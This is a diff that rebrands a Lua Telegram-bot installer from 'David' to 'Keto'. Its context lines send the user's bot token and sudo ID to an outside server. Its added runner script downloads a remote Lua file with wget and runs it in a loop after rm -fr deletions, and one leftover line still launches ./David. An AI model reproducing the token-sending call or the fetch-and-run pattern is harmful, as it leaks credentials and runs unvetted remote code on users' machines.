@@ -16,9 +16,9 @@ local Create_Info = function(Token,Sudo)
 local Write_Info_Sudo = io.open("sudo.lua", 'w')
 Write_Info_Sudo:write([[
 
-s = "W5555"
+s = "uuuuu1"
 
-q = "L9L9L"
+q = "KetoTeam"
 
 token = "]]..Token..[["
 
@@ -68,27 +68,27 @@ local function Files_Info_Get()
 Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
 local t = json:decode(https.request('https://apiabs.ml/config.php?Get=David&DevId='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write")))
 print("::David::")
-local RunBot = io.open("David", 'w')
+local RunBot = io.open("Keto", 'w')
 RunBot:write([[
 #!/usr/bin/env bash
-cd $HOME/David
+cd $HOME/Keto
 token="]]..database:get(Server_Done.."Token_Write")..[["
 rm -fr David.lua
-wget "https://raw.githubusercontent.com/DavidTeam0/David/master/David.lua"
+wget "https://raw.githubusercontent.com/KetoTeam/Keto/master/Keto.lua"
 while(true) do
 rm -fr ../.telegram-cli
-./tg -s ./David.lua -p PROFILE --bot=$token
+./tg -s ./Keto.lua -p PROFILE --bot=$token
 done
 ]])
 RunBot:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/David
+cd $HOME/Keto
 while(true) do
 rm -fr ../.telegram-cli
-screen -S David -X kill
-screen -S David ./David
+screen -S Keto -X kill
+screen -S Keto ./David
 done
 ]])
 RunTs:close()
